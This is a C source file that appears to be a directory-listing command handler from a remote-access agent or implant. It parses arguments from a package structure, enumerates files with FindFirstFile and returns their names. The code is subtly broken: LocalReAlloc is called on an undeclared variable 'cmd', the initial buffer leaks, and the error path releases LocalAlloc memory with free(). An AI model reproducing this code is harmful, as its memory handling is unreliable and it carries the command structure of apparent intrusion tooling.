#include "Dir.h"

PPackage executeDir(PParser arguments)
{
	UINT32 nbArg = getInt32(arguments); // if no arguments, this will be b"\x00\x00\x00\x00"
	SIZE_T size = 0;
  PCHAR path = (PCHAR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * sizeof(CHAR));

	// Initialize path (current directory if no argument given) 
	if (nbArg != 0)
	{
		path = getString(arguments, &size); // will read first UINT32 as size of param
		// Ensure proper null termination
		path = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	}
	else
	{
		strcpy(path, ".");
	}

	PPackage output = newPackage(0, FALSE);

	// Create search pattern with wilcard (all files in dir)
	PCHAR searchPattern = (PCHAR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 2) * sizeof(CHAR));
	snprintf(searchPattern, MAX_PATH + 2, "%s\\*", path);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(searchPattern, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		_err("[DIR] Error in executeDir command");
		freePackage(output);
		free(searchPattern);
		free(path);
		return NULL;
	}
	do
	{
		addString(output, FindFileData.cFileName, FALSE);
	} while (FindNextFile(hFind, &FindFileData) != 0);

	FindClose(hFind);
	LocalFree(searchPattern);
	LocalFree(path);
	return output;
}
